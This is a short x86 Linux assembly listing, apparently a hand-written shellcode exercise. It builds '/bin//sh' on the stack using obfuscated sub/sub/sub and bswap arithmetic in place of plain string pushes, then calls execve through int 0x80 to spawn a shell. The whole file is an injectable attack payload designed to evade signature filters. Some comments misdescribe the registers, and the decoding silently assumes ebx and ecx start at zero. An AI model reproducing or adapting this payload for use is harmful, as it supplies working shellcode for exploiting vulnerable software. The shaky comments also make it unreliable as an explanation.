global _start

section .text
_start:

	xor edx,edx     ; zero-out edx
        push edx        ; we put our null termination character
        
	
	;push 0x68732f2f ; we push the string  /bin//sh in reverse order
        ;push 0x6e69622f
        
	
	; Time to try new things. This sub,sub,sub technique (muts)

	sub ebx,0x577a7066              ; This gives a final value of 0x6e2f7368 in eax (6 bytes each)
        sub ebx,0x577a7066              ; Just what we need but in reverse order :(
        sub ebx,0xe2dbabcc
        bswap ebx                       ; This changes the byte order in the registry (2 bytes)
	push ebx			; put the first part of /bin//sh
	
        sub ecx,0x7e7e5b5b              ; This works. Not sure why, but it does.
        sub ecx,0x7e7e5b5b              ; Yields 0x69622f2f in ecx
        sub ecx,0x99a11a1b
	push ecx			; Put the 2nd string in the stack

	mov ebx, esp    ; we get the pointer to /bin//sh currently the top
                        ; of the stack
        push edx        ; we push a null terminator for argv[]
        push ebx        ; we put a null on argv[], we don't need it
        mov ecx, esp    ; we get our pointer to argv[], null terminated

        mov al,0xb      ; execve() = 11
        int 0x80
	
